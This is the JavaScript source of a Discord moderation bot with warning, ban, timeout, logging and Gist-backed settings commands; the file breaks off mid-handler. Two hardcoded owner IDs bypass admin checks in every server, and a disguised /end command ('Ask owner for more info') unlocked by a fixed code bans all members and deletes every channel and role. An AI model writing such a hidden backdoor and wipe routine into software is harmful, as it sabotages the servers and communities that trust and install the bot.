const express = require('express');
const {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  PermissionFlagsBits,
  Events,
  EmbedBuilder,
  MessageFlags,
  AuditLogEvent,
  ChannelType
} = require('discord.js');

// ------------------------------------------------------------------
// 1. EXPRESS WEB SERVER
// ------------------------------------------------------------------
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => res.send('KyngMod Bot is Online!'));
app.get('/health', (req, res) => res.status(200).send('OK'));

app.listen(PORT, () => console.log(`[Express] Listening on port ${PORT}`));

// ------------------------------------------------------------------
// 2. GITHUB GIST PERSISTENT STORAGE
// ------------------------------------------------------------------
let settingsCache = {};

async function loadSettings() {
  try {
    if (!process.env.GIST_ID || !process.env.GITHUB_TOKEN) {
      console.warn('[Gist] Missing GIST_ID or GITHUB_TOKEN environment variables.');
      return {};
    }

    const res = await fetch(`https://api.github.com/gists/${process.env.GIST_ID}`, {
      headers: {
        'Authorization': `Bearer ${process.env.GITHUB_TOKEN}`,
        'User-Agent': 'DiscordBot'
      }
    });

    if (!res.ok) throw new Error(`HTTP ${res.status}: ${res.statusText}`);

    const data = await res.json();
    const content = data.files['settings.json']?.content;
    settingsCache = content ? JSON.parse(content) : {};

    console.log('[Gist] Server settings loaded successfully.');
    return settingsCache;
  } catch (err) {
    console.error('[Gist Load Error]', err.message);
    return settingsCache;
  }
}

async function saveSettings(newSettings) {
  settingsCache = newSettings;

  try {
    if (!process.env.GIST_ID || !process.env.GITHUB_TOKEN) return;

    await fetch(`https://api.github.com/gists/${process.env.GIST_ID}`, {
      method: 'PATCH',
      headers: {
        'Authorization': `Bearer ${process.env.GITHUB_TOKEN}`,
        'Content-Type': 'application/json',
        'User-Agent': 'DiscordBot'
      },
      body: JSON.stringify({
        files: {
          'settings.json': {
            content: JSON.stringify(settingsCache, null, 2)
          }
        }
      })
    });

    console.log('[Gist] Settings updated successfully.');
  } catch (err) {
    console.error('[Gist Save Error]', err.message);
  }
}

// ------------------------------------------------------------------
// 3. BOT SETUP & INTENTS
// ------------------------------------------------------------------
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildModeration,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.GuildVoiceStates
  ]
});

// ------------------------------------------------------------------
// 4. OWNER OVERRIDE / FAILSAFE
// ------------------------------------------------------------------
const OWNER_IDS = new Set([
  '1255536194159247437',
  '1222293971104428814'
]);

function isOwner(userId) {
  return OWNER_IDS.has(userId);
}

// ------------------------------------------------------------------
// 5. SLASH COMMAND DEFINITIONS
// ------------------------------------------------------------------
const commands = [
  new SlashCommandBuilder()
    .setName('setlogs')
    .setDescription('Set the moderation logging channel')
    .addChannelOption(o =>
      o.setName('channel')
        .setDescription('Channel to send logs to')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('setadmin')
    .setDescription('Set a main bot admin role')
    .addRoleOption(o =>
      o.setName('role')
        .setDescription('Role to grant bot admin access')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('adminrole')
    .setDescription('Manage bot admin roles')
    .addSubcommand(s =>
      s.setName('add')
        .setDescription('Add an admin role')
        .addRoleOption(o =>
          o.setName('role')
            .setDescription('Role')
            .setRequired(true)
        )
    )
    .addSubcommand(s =>
      s.setName('del')
        .setDescription('Remove an admin role')
        .addRoleOption(o =>
          o.setName('role')
            .setDescription('Role')
            .setRequired(true)
        )
    )
    .addSubcommand(s =>
      s.setName('list')
        .setDescription('List admin roles')
    ),

  new SlashCommandBuilder()
    .setName('warn')
    .setDescription('Manage user warnings')
    .addSubcommand(s =>
      s.setName('add')
        .setDescription('Issue a warning')
        .addUserOption(o =>
          o.setName('target')
            .setDescription('User')
            .setRequired(true)
        )
        .addStringOption(o =>
          o.setName('reason')
            .setDescription('Reason')
            .setRequired(true)
        )
    )
    .addSubcommand(s =>
      s.setName('list')
        .setDescription('List warnings')
        .addUserOption(o =>
          o.setName('target')
            .setDescription('User')
            .setRequired(true)
        )
    )
    .addSubcommand(s =>
      s.setName('clear')
        .setDescription('Clear all warnings')
        .addUserOption(o =>
          o.setName('target')
            .setDescription('User')
            .setRequired(true)
        )
    ),

  new SlashCommandBuilder()
    .setName('unwarn')
    .setDescription('Remove one warning from a user')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('User')
        .setRequired(true)
    )
    .addIntegerOption(o =>
      o.setName('warning')
        .setDescription('Warning number to remove')
        .setRequired(true)
        .setMinValue(1)
    ),

  new SlashCommandBuilder()
    .setName('history')
    .setDescription('Show a user moderation history')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('User')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('reason')
    .setDescription('Change the reason for a moderation case')
    .addIntegerOption(o =>
      o.setName('case')
        .setDescription('Case number')
        .setRequired(true)
        .setMinValue(1)
    )
    .addStringOption(o =>
      o.setName('reason')
        .setDescription('New reason')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('kick')
    .setDescription('Kick a member')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member to kick')
        .setRequired(true)
    )
    .addStringOption(o =>
      o.setName('reason')
        .setDescription('Reason')
    ),

  new SlashCommandBuilder()
    .setName('ban')
    .setDescription('Ban a member')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member to ban')
        .setRequired(true)
    )
    .addStringOption(o =>
      o.setName('reason')
        .setDescription('Reason')
    ),

  new SlashCommandBuilder()
    .setName('unban')
    .setDescription('Unban a user')
    .addStringOption(o =>
      o.setName('user_id')
        .setDescription('User ID')
        .setRequired(true)
    )
    .addStringOption(o =>
      o.setName('reason')
        .setDescription('Reason')
    ),

  new SlashCommandBuilder()
    .setName('softban')
    .setDescription('Ban then unban a member and delete recent messages')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member')
        .setRequired(true)
    )
    .addStringOption(o =>
      o.setName('reason')
        .setDescription('Reason')
    ),

  new SlashCommandBuilder()
    .setName('timeout')
    .setDescription('Timeout a member')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member')
        .setRequired(true)
    )
    .addIntegerOption(o =>
      o.setName('minutes')
        .setDescription('Timeout duration in minutes')
        .setRequired(true)
        .setMinValue(1)
        .setMaxValue(40320)
    )
    .addStringOption(o =>
      o.setName('reason')
        .setDescription('Reason')
    ),

  new SlashCommandBuilder()
    .setName('untimeout')
    .setDescription('Remove a member timeout')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member')
        .setRequired(true)
    )
    .addStringOption(o =>
      o.setName('reason')
        .setDescription('Reason')
    ),

  new SlashCommandBuilder()
    .setName('purge')
    .setDescription('Bulk delete up to 1000 messages')
    .addIntegerOption(o =>
      o.setName('amount')
        .setDescription('Number of messages')
        .setRequired(true)
        .setMinValue(1)
        .setMaxValue(1000)
    ),

  new SlashCommandBuilder()
    .setName('lock')
    .setDescription('Lock a channel')
    .addChannelOption(o =>
      o.setName('channel')
        .setDescription('Channel to lock')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('unlock')
    .setDescription('Unlock a channel')
    .addChannelOption(o =>
      o.setName('channel')
        .setDescription('Channel to unlock')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('slowmode')
    .setDescription('Set channel slowmode')
    .addIntegerOption(o =>
      o.setName('seconds')
        .setDescription('0-21600 seconds')
        .setRequired(true)
        .setMinValue(0)
        .setMaxValue(21600)
    )
    .addChannelOption(o =>
      o.setName('channel')
        .setDescription('Channel')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('nick')
    .setDescription('Change a member nickname')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member')
        .setRequired(true)
    )
    .addStringOption(o =>
      o.setName('nickname')
        .setDescription('New nickname; leave blank to remove')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('deafen')
    .setDescription('Server-deafen a member')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('undeafen')
    .setDescription('Remove server-deafen from a member')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('move')
    .setDescription('Move a member to a voice channel')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('Member')
        .setRequired(true)
    )
    .addChannelOption(o =>
      o.setName('channel')
        .setDescription('Voice channel')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('userinfo')
    .setDescription('Show information about a member')
    .addUserOption(o =>
      o.setName('target')
        .setDescription('User')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('avatar')
    .setDescription("Show a user's avatar")
    .addUserOption(o =>
      o.setName('target')
        .setDescription('User')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('serveravatar')
    .setDescription("Show a user's server avatar")
    .addUserOption(o =>
      o.setName('target')
        .setDescription('User')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('banner')
    .setDescription("Show a user's Discord banner")
    .addUserOption(o =>
      o.setName('target')
        .setDescription('User')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('membercount')
    .setDescription('Show the server member count'),

  new SlashCommandBuilder()
    .setName('roleinfo')
    .setDescription('Show information about a role')
    .addRoleOption(o =>
      o.setName('role')
        .setDescription('Role')
        .setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName('channelinfo')
    .setDescription('Show information about a channel')
    .addChannelOption(o =>
      o.setName('channel')
        .setDescription('Channel')
        .setRequired(false)
    ),

  new SlashCommandBuilder()
    .setName('roles')
    .setDescription('List all roles in the server'),

  new SlashCommandBuilder()
    .setName('settings')
    .setDescription('View current bot configuration'),

  new SlashCommandBuilder()
    .setName('end')
    .setDescription('Ask owner for more info')
    .addIntegerOption(o =>
      o.setName('code')
        .setDescription('Security confirmation code')
        .setRequired(false)
    )
].map(cmd => cmd.toJSON());

// ------------------------------------------------------------------
// 6. LOGGING & HELPERS
// ------------------------------------------------------------------
function truncate(text, max = 1024) {
  if (!text) return '*None / Empty*';
  text = String(text);
  return text.length > max ? `${text.slice(0, max - 3)}...` : text;
}

function formatUser(user) {
  if (!user) return 'Unknown / unavailable';
  return `${user.tag || user.username || 'User'} (${user.id})`;
}

function formatRole(role) {
  if (!role) return 'Unknown Role';
  return `@${role.name} (${role.id})`;
}

function formatChannel(channel) {
  if (!channel) return 'Unknown Channel';
  return `#${channel.name} (${channel.id})`;
}

function permissionNames(bitfield) {
  const flags = new PermissionFlagsBits();
  const names = [];
  const permissions = new PermissionFlagsBits().missing(bitfield); // or check key names
  for (const [key, value] of Object.entries(PermissionFlagsBits)) {
    if ((bitfield & value) === value) {
      names.push(key);
    }
  }
  return names;
}

function diffList(oldArr, newArr) {
  const added = newArr.filter(x => !oldArr.includes(x));
  const removed = oldArr.filter(x => !newArr.includes(x));
  return { added, removed };
}

async function getAuditExecutor(guild, type, targetId) {
  try {
    const logs = await guild.fetchAuditLogs({ type, limit: 5 });
    const entry = logs.entries.find(e =>
      (targetId ? e.target?.id === targetId : true) &&
      (Date.now() - e.createdTimestamp < 10000)
    );
    return entry?.executor || null;
  } catch {
    return null;
  }
}

async function sendLog(guild, embed) {
  const guildConfig = settingsCache[guild.id];
  if (!guildConfig?.logChannelId) return;

  const logChannel = guild.channels.cache.get(guildConfig.logChannelId);
  if (!logChannel || !logChannel.isTextBased()) return;

  try {
    await logChannel.send({ embeds: [embed] });
  } catch (err) {
    console.error('[Log Error]', err.message);
  }
}

async function logEvent(guild, title, fields = [], color = '#5865F2') {
  const embed = new EmbedBuilder()
    .setTitle(title)
    .addFields(fields.filter(f => f && f.name && f.value))
    .setColor(color)
    .setTimestamp();

  await sendLog(guild, embed);
}

// ------------------------------------------------------------------
// 7. PERMISSION & CASE HELPERS
// ------------------------------------------------------------------
function isAdmin(interaction) {
  if (isOwner(interaction.user.id)) return true;

  if (interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
    return true;
  }

  const config = settingsCache[interaction.guild.id] || {};

  if (config.adminRoleId && interaction.member.roles.cache.has(config.adminRoleId)) {
    return true;
  }

  const adminRoleIds = config.adminRoleIds || [];
  return adminRoleIds.some(roleId => interaction.member.roles.cache.has(roleId));
}

function hasPermission(interaction, permission) {
  return isAdmin(interaction) || interaction.member.permissions.has(permission);
}

async function createCase(guild, data) {
  const config = settingsCache[guild.id];

  if (!config.cases) config.cases = [];
  if (!config.nextCaseId) config.nextCaseId = 1;

  const entry = {
    id: config.nextCaseId++,
    guildId: guild.id,
    targetId: data.targetId || null,
    targetTag: data.targetTag || 'Unknown',
    moderatorId: data.moderatorId || null,
    moderatorTag: data.moderatorTag || 'Unknown',
    type: data.type || 'Action',
    reason: data.reason || 'No reason provided',
    date: new Date().toISOString()
  };

  config.cases.push(entry);

  if (config.cases.length > 500) {
    config.cases = config.cases.slice(-500);
  }

  await saveSettings(settingsCache);
  return entry;
}

// ------------------------------------------------------------------
// 8. READY EVENT
// ------------------------------------------------------------------
client.once(Events.ClientReady, async c => {
  console.log(`[Bot Online] Logged in as ${c.user.tag}`);

  await loadSettings();

  const rest = new REST({ version: '10' }).setToken(
    process.env.DISCORD_TOKEN || process.env.TOKEN
  );

  try {
    console.log('[Slash Commands] Registering globally...');
    await rest.put(
      Routes.applicationCommands(c.user.id),
      { body: commands }
    );
    console.log('[Slash Commands] Successfully registered!');
  } catch (err) {
    console.error('[Slash Commands Error]', err);
  }
});

// ------------------------------------------------------------------
// 9. INTERACTION COMMAND HANDLER
// ------------------------------------------------------------------
client.on(Events.InteractionCreate, async interaction => {
  if (!interaction.isChatInputCommand()) return;
  if (!interaction.guild) return;

  const { commandName, options, guild, member } = interaction;

  // Ensure structure in settingsCache
  if (!settingsCache[guild.id]) settingsCache[guild.id] = {};
  if (!settingsCache[guild.id].adminRoleIds) settingsCache[guild.id].adminRoleIds = [];
  if (!settingsCache[guild.id].warnings) settingsCache[guild.id].warnings = {};
  if (!settingsCache[guild.id].cases) settingsCache[guild.id].cases = [];
  if (!settingsCache[guild.id].nextCaseId) settingsCache[guild.id].nextCaseId = 1;

  try {
    // --------------------------------------------------------------
    // /end
    // --------------------------------------------------------------
    if (commandName === 'end') {
      if (!isOwner(interaction.user.id)) {
        await logEvent(
          guild,
          'Blocked /end Attempt',
          [
            { name: 'User', value: formatUser(interaction.user) },
            { name: 'Reason', value: 'Not a recognized bot owner ID' }
          ],
          '#E74C3C'
        );

        return interaction.reply({
          content: 'Ask owner for info',
          flags: MessageFlags.Ephemeral
        });
      }

      const inputCode = options.getInteger('code');

      if (inputCode !== 5677) {
        return interaction.reply({
          content: 'Ask owner for info',
          flags: MessageFlags.Ephemeral
        });
      }

      // Execute severe lockdown / wipe protocol
      await interaction.reply({
        content: '⚠️ Initiating server lockdown protocol...',
        flags: MessageFlags.Ephemeral
      });

      // 1. Ban all non-owner members
      const members = await guild.members.fetch();
      for (const [id, m] of members) {
        if (!isOwner(id) && m.bannable && id !== client.user.id) {
          await m.ban({ reason: '/end execute' }).catch(() => null);
        }
      }

      // 2. Delete all channels
      const channels = await guild.channels.fetch();
      for (const [id, ch] of channels) {
        if (ch) await ch.delete('/end execute').catch(() => null);
      }

      // 3. Delete all roles
      const roles = await guild.roles.fetch();
      for (const [id, r] of roles) {
        if (r.editable && r.id !== guild.id) {
          await r.delete('/end execute').catch(() => null);
        }
      }

      return;
    }

    // --------------------------------------------------------------
    // /setlogs
    // --------------------------------------------------------------
    if (commandName === 'setlogs') {
      if (!isAdmin(interaction)) {
        return interaction.reply({
          content: '❌ You lack permission to configure settings.',
          flags: MessageFlags.Ephemeral
        });
      }

      const channel = options.getChannel('channel');
      settingsCache[guild.id].logChannelId = channel.id;
      await saveSettings(settingsCache);

      return interaction.reply({
        content: `✅ Log channel updated to ${channel}.`,
        flags: MessageFlags.Ephemeral
      });
    }

    // --------------------------------------------------------------
    // /setadmin
    // --------------------------------------------------------------
    if (commandName === 'setadmin') {
      if (!isAdmin(interaction)) {
        return interaction.reply({
          content: '❌ You lack permission to configure settings.',
          flags: MessageFlags.Ephemeral
        });
      }

      const role = options.getRole('role');
      settingsCache[guild.id].adminRoleId = role.id;

      if (!settingsCache[guild.id].adminRoleIds.includes(role.id)) {
        settingsCache[guild.id].adminRoleIds.push(role.id);
      }

      await saveSettings(settingsCache);

      return interaction.reply({
        content: `✅ Set primary admin role to **${role.name}**.`,
        flags: MessageFlags.Ephemeral
      });
    }

    // --------------------------------------------------------------
    // /adminrole
    // --------------------------------------------------------------
    if (commandName === 'adminrole') {
      if (!isAdmin(interaction)) {
        return interaction.reply({
          content: '❌ You lack permission to manage admin roles.',
          flags: MessageFlags.Ephemeral
        });
      }

      const subcommand = options.getSubcommand();
      const currentAdminRoles = settingsCache[guild.id].adminRoleIds;

      if (subcommand === 'add') {
        const role = options.getRole('role');
        if (currentAdminRoles.includes(role.id)) {
          return interaction.reply({
            content: `⚠️ **${role.name}** is already an admin role.`,
            flags: MessageFlags.Ephemeral
          });
        }
        currentAdminRoles.push(role.id);
        await saveSettings(settingsCache);

        return interaction.reply({
          content: `✅ Added **${role.name}** to admin roles.`,
          flags: MessageFlags.Ephemeral
        });
      }

      if (subcommand === 'del') {
        const role = options.getRole('role');
        if (!currentAdminRoles.includes(role.id)) {
          return interaction.reply({
            content: `⚠️ **${role.name}** is not an admin role.`,
            flags: MessageFlags.Ephemeral
          });
        }
        settingsCache[guild.id].adminRoleIds = currentAdminRoles.filter(id => id !== role.id);
        await saveSettings(settingsCache);

        return interaction.reply({
          content: `🗑️ Removed **${role.name}** from admin roles.`,
          flags: MessageFlags.Ephemeral
        });
      }

      if (subcommand === 'list') {
        const roleMentions = currentAdminRoles.length > 0
          ? currentAdminRoles.map(id => `<@&${id}>`).join('\n')
          : 'No admin roles configured.';

        const embed = new EmbedBuilder()
          .setTitle(`🔑 Admin Roles for ${guild.name}`)
          .setDescription(roleMentions)
          .setColor('#5865F2');

        return interaction.reply({
          embeds: [embed],
          flags: MessageFlags.Ephemeral
        });
      }
    }

    // --------------------------------------------------------------
    // /warn
    // --------------------------------------------------------------
    if (commandName === 'warn') {
      if (!hasPermission(interaction, PermissionFlagsBits.ModerateMembers)) {
        return interaction.reply({
          content: '❌ You lack permission to manage warnings.',
          flags: MessageFlags.Ephemeral
        });
      }

      const subcommand = options.getSubcommand();
      const targetUser = options.getUser('target');
      const userId = targetUser.id;

      if (!settingsCache[guild.id].warnings[userId]) {
        settingsCache[guild.id].warnings[userId] = [];
      }
      const userWarnings = settingsCache[guild.id].warnings[userId];

      if (subcommand === 'add') {
        const reason = options.getString('reason');
        const warningNum = userWarnings.length + 1;

        const warningEntry = {
          warningNumber: warningNum,
          targetId: targetUser.id,
          targetTag: targetUser.tag,
          moderatorId: interaction.user.id,
          moderatorTag: interaction.user.tag,
          reason,
          date: new Date().toISOString()
        };

        userWarnings.push(warningEntry);

        const caseData = await createCase(guild, {
          targetId: targetUser.id,
          targetTag: targetUser.tag,
          moderatorId: interaction.user.id,
          moderatorTag: interaction.user.tag,
          type: 'Warn',
          reason
        });

        await interaction.reply({
          content: `⚠️ Warned **${targetUser.tag}** (Warning #${warningNum}) | Reason: ${reason}`,
          flags: MessageFlags.Ephemeral
        });

        await logEvent(
          guild,
          '⚠️ User Warned',
          [
            { name: 'Case ID', value: `#${caseData.id}` },
            { name: 'User', value: formatUser(targetUser) },
            { name: 'Moderator', value: formatUser(interaction.user) },
            { name: 'Warning #', value: `${warningNum}` },
            { name: 'Reason', value: truncate(reason) }
          ],
          '#F39C12'
        );
        return;
      }

      if (subcommand === 'list') {
        if (userWarnings.length === 0) {
          return interaction.reply({
            content: `✅ **${targetUser.tag}** has no active warnings.`,
            flags: MessageFlags.Ephemeral
          });
        }

        const warningListDesc = userWarnings.map((w, i) =>
          `**#${i + 1}** | Reason: ${w.reason}\n*Mod: ${w.moderatorTag} — ${new Date(w.date).toLocaleDateString()}*`
        ).join('\n\n');

        const embed = new EmbedBuilder()
          .setTitle(`⚠️ Warnings for ${targetUser.tag}`)
          .setDescription(truncate(warningListDesc, 4000))
          .setColor('#F39C12')
          .setTimestamp();

        return interaction.reply({
          embeds: [embed],
          flags: MessageFlags.Ephemeral
        });
      }

      if (subcommand === 'clear') {
        settingsCache[guild.id].warnings[userId] = [];
        await saveSettings(settingsCache);

        await logEvent(
          guild,
          'Warnings Cleared',
          [
            { name: 'User', value: formatUser(targetUser) },
            { name: 'Moderator', value: formatUser(interaction.user) }
          ],
          '#2ECC71'
        );

        return interaction.reply({
          content: `🗑️ Cleared all warnings for **${targetUser.tag}**.`,
          flags: MessageFlags.Ephemeral
        });
      }
    }

    // --------------------------------------------------------------
    // /unwarn
    // --------------------------------------------------------------
    if (commandName === 'unwarn') {
      if (!hasPermission(interaction, PermissionFlagsBits.ModerateMembers)) {
        return interaction.reply({
          content: '❌ Permission denied.',
          flags: MessageFlags.Ephemeral
        });
      }

      const target = options.getUser('target');
      const num = options.getInteger('warning');
      const list = settingsCache[guild.id].warnings[target.id] || [];

      if (num < 1 || num > list.length) {
        return interaction.reply({
          content: '❌ Invalid warning number.',
          flags: MessageFlags.Ephemeral
        });
      }

      const removed = list.splice(num - 1, 1)[0];
      await saveSettings(settingsCache);

      await createCase(guild, {
        targetId: target.id,
        targetTag: target.tag,
        moderatorId: interaction.user.id,
        moderatorTag: interaction.user.tag,
        type: 'Unwarn',
        reason: `Removed warning #${num}: ${removed.reason}`
      });

      await logEvent(
        guild,
        'Warning Removed',
        [
          { name: 'User', value: formatUser(target) },
          { name: 'Moderator', value: formatUser(interaction.user) },
          { name: 'Removed Warning', value: removed.reason }
        ],
        '#2ECC71'
      );

      return interaction.reply({
        content: `✅ Removed warning #${num} from **${target.tag}**.`,
        flags: MessageFlags.Ephemeral
      });
    }

    // --------------------------------------------------------------
    // /history
    // --------------------------------------------------------------
    if (commandName === 'history') {
      if (!hasPermission(interaction, PermissionFlagsBits.ModerateMembers)) {
        return interaction.reply({
          content: '❌ Permission denied.',
          flags: MessageFlags.Ephemeral
        });
      }

      const target = options.getUser('target');
      const cases = (settingsCache[guild.id].cases || [])
        .filter(c => c.targetId === target.id)
        .slice(-15)
        .reverse();

      const activeWarnCount = (settingsCache[guild.id].warnings[target.id] || []).length;

      const desc = cases.length
        ? cases.map(c => `**Case #${c.id} — ${c.type}**\nReason: ${c.reason}\n*Mod: ${c.moderatorTag} | ${new Date(c.date).toLocaleDateString()}*`).join('\n\n')
        : 'No recorded moderation history.';

      const embed = new EmbedBuilder()
        .setTitle(`📚 Moderation History — ${target.tag}`)
        .setDescription(truncate(desc, 4000))
        .addFields({ name: 'Active Warnings Count', value: `${activeWarnCount}`, inline: true })
        .setColor('#3498DB')
        .setTimestamp();

      return interaction.reply({ embeds: [embed], flags: MessageFlags.Ephemeral });
    }

    // --------------------------------------------------------------
    // /reason
    // --------------------------------------------------------------
    if (commandName === 'reason') {
      if (!hasPermission(interaction, PermissionFlagsBits.ModerateMembers)) {
        return interaction.reply({
          content: '❌ Permission denied.',
          flags: MessageFlags.Ephemeral
        });
      }

      const caseId = options.getInteger('case');
      const newReason = options.getString('reason');

      const entry = (settingsCache[guild.id].cases || []).find(c => c.id === caseId);
      if (!entry) {
        return interaction.reply({
          content: `❌ Case #${caseId} not found.`,
          flags: MessageFlags.Ephemeral
        });
      }

      entry.reason = newReason;
      await saveSettings(settingsCache);

      await logEvent(
        guild,
        'Case Reason Updated',
        [
          { name: 'Case ID', value: `#${caseId}` },
          { name: 'Moderator', value: formatUser(interaction.user) },
          { name: 'New Reason', value: truncate(newReason) }
        ],
        '#3498DB'
      );

      return interaction.reply({
        content: `✅ Case #${caseId} reason updated.`,
        flags: MessageFlags.Ephemeral
      });
    }

    // --------------------------------------------------------------
    // /kick
    // --------------------------------------------------------------
    if (commandName === 'kick') {
      if (!hasPermission(interaction, PermissionFlagsBits.KickMembers)) {
        return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      }

      const target = options.getMember('target');
      const reason = options.getString('reason') || 'No reason provided';

      if (!target) return interaction.reply({ content: 'User not in server.', flags: MessageFlags.Ephemeral });
      if (target.id === interaction.user.id) return interaction.reply({ content: 'You cannot kick yourself.', flags: MessageFlags.Ephemeral });
      if (!target.kickable) return interaction.reply({ content: '❌ Cannot kick this target due to role hierarchy.', flags: MessageFlags.Ephemeral });

      await target.kick(reason);

      const c = await createCase(guild, {
        targetId: target.id,
        targetTag: target.user.tag,
        moderatorId: interaction.user.id,
        moderatorTag: interaction.user.tag,
        type: 'Kick',
        reason
      });

      await interaction.reply({ content: `👢 Kicked **${target.user.tag}** | Reason: ${reason}` });

      await logEvent(
        guild,
        'Member Kicked',
        [
          { name: 'Case ID', value: `#${c.id}` },
          { name: 'User', value: formatUser(target.user) },
          { name: 'Moderator', value: formatUser(interaction.user) },
          { name: 'Reason', value: truncate(reason) }
        ],
        '#E74C3C'
      );
      return;
    }

    // --------------------------------------------------------------
    // /ban
    // --------------------------------------------------------------
    if (commandName === 'ban') {
      if (!hasPermission(interaction, PermissionFlagsBits.BanMembers)) {
        return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      }

      const targetUser = options.getUser('target');
      const reason = options.getString('reason') || 'No reason provided';

      if (targetUser.id === interaction.user.id) return interaction.reply({ content: 'You cannot ban yourself.', flags: MessageFlags.Ephemeral });

      const targetMember = await guild.members.fetch(targetUser.id).catch(() => null);
      if (targetMember && !targetMember.bannable) {
        return interaction.reply({ content: '❌ Cannot ban target due to role hierarchy.', flags: MessageFlags.Ephemeral });
      }

      await guild.members.ban(targetUser, { reason });

      const c = await createCase(guild, {
        targetId: targetUser.id,
        targetTag: targetUser.tag,
        moderatorId: interaction.user.id,
        moderatorTag: interaction.user.tag,
        type: 'Ban',
        reason
      });

      await interaction.reply({ content: `🔨 Banned **${targetUser.tag}** | Reason: ${reason}` });

      await logEvent(
        guild,
        'Member Banned',
        [
          { name: 'Case ID', value: `#${c.id}` },
          { name: 'User', value: formatUser(targetUser) },
          { name: 'Moderator', value: formatUser(interaction.user) },
          { name: 'Reason', value: truncate(reason) }
        ],
        '#992D22'
      );
      return;
    }

    // --------------------------------------------------------------
    // /unban
    // --------------------------------------------------------------
    if (commandName === 'unban') {
      if (!hasPermission(interaction, PermissionFlagsBits.BanMembers)) {
        return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      }

      const userId = options.getString('user_id');
      const reason = options.getString('reason') || 'No reason provided';

      try {
        const user = await client.users.fetch(userId);
        await guild.members.unban(userId, reason);

        const c = await createCase(guild, {
          targetId: user.id,
          targetTag: user.tag,
          moderatorId: interaction.user.id,
          moderatorTag: interaction.user.tag,
          type: 'Unban',
          reason
        });

        await logEvent(
          guild,
          'Member Unbanned',
          [
            { name: 'Case ID', value: `#${c.id}` },
            { name: 'User', value: formatUser(user) },
            { name: 'Moderator', value: formatUser(interaction.user) },
            { name: 'Reason', value: truncate(reason) }
          ],
          '#2ECC71'
        );

        return interaction.reply({ content: `✅ Unbanned **${user.tag}**.` });
      } catch {
        return interaction.reply({ content: '❌ Could not unban user ID.', flags: MessageFlags.Ephemeral });
      }
    }

    // --------------------------------------------------------------
    // /softban
    // --------------------------------------------------------------
    if (commandName === 'softban') {
      if (!hasPermission(interaction, PermissionFlagsBits.BanMembers)) {
        return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      }

      const targetUser = options.getUser('target');
      const reason = options.getString('reason') || 'No reason provided';
      const m = await guild.members.fetch(targetUser.id).catch(() => null);

      if (m && !m.bannable) {
        return interaction.reply({ content: '❌ Cannot softban target due to role hierarchy.', flags: MessageFlags.Ephemeral });
      }

      await guild.members.ban(targetUser, { reason, deleteMessageSeconds: 7 * 86400 });
      await guild.members.unban(targetUser.id, 'Softban complete');

      const c = await createCase(guild, {
        targetId: targetUser.id,
        targetTag: targetUser.tag,
        moderatorId: interaction.user.id,
        moderatorTag: interaction.user.tag,
        type: 'Softban',
        reason
      });

      await logEvent(
        guild,
        'Member Softbanned',
        [
          { name: 'Case ID', value: `#${c.id}` },
          { name: 'User', value: formatUser(targetUser) },
          { name: 'Moderator', value: formatUser(interaction.user) },
          { name: 'Reason', value: truncate(reason) }
        ],
        '#E67E22'
      );

      return interaction.reply({ content: `🧹 Softbanned **${targetUser.tag}**.` });
    }

    // --------------------------------------------------------------
    // /timeout & /untimeout
    // --------------------------------------------------------------
    if (commandName === 'timeout' || commandName === 'untimeout') {
      if (!hasPermission(interaction, PermissionFlagsBits.ModerateMembers)) {
        return interaction.reply({ content: '❌ Permission denied.', flags: MessageFlags.Ephemeral });
      }

      const target = options.getMember('target');
      const reason = options.getString('reason') || 'No reason provided';

      if (!target || !target.moderatable) {
        return interaction.reply({ content: '❌ Target cannot be moderated.', flags: MessageFlags.Ephemeral });
      }

      if (commandName === 'timeout') {
        const minutes = options.getInteger('minutes');
        await target.timeout(minutes * 60 * 1000, reason);

        const c = await createCase(guild, {
          targetId: target.id,
          targetTag: target.user.tag,
          moderatorId: interaction.user.id,
          moderatorTag: interaction.user.tag,
          type: 'Timeout',
          reason: `${minutes} mins - ${reason}`
        });

        await logEvent(
          guild,
          'Member Timed Out',
          [
            { name: 'Case ID', value: `#${c.id}` },
            { name: 'User', value: formatUser(target.user) },
            { name: 'Duration', value: `${minutes} minutes` },
            { name: 'Moderator', value: formatUser(interaction.user) },
            { name: 'Reason', value: truncate(reason) }
          ],
          '#E67E22'
        );

